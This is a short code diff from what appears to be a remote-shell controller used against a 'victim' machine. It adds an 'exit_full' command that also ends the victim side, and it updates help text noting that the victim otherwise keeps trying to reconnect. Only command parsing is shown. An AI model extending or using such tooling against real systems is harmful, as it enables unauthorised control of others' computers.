@@ -19,10 +19,10 @@ def parse_custom_command(cmd: list) -> list:
         print("Emtpy command")
     elif cmd[1] == "help":
         show_help()
-    elif cmd[1] == "exit":
+    elif cmd[1] == "exit" or cmd[1] == "exit_full":
         print("Exiting")
         exit_flag = True
-        return "-> exit".split(" ")
+        return cmd
     elif cmd[1] == "simple":
         output_style = "simple"
     elif cmd[1] == "full":
@@ -111,7 +111,9 @@ Once connected, you can send shell command for the victim to execute
 -> help
     - to see this page
 -> exit 
-    - to exit shell
+    - to exit shell locally, victim return to trying to connect
+-> exit_full 
+    - to let victim exit too
 -> simple
     - to simplify output
 -> full
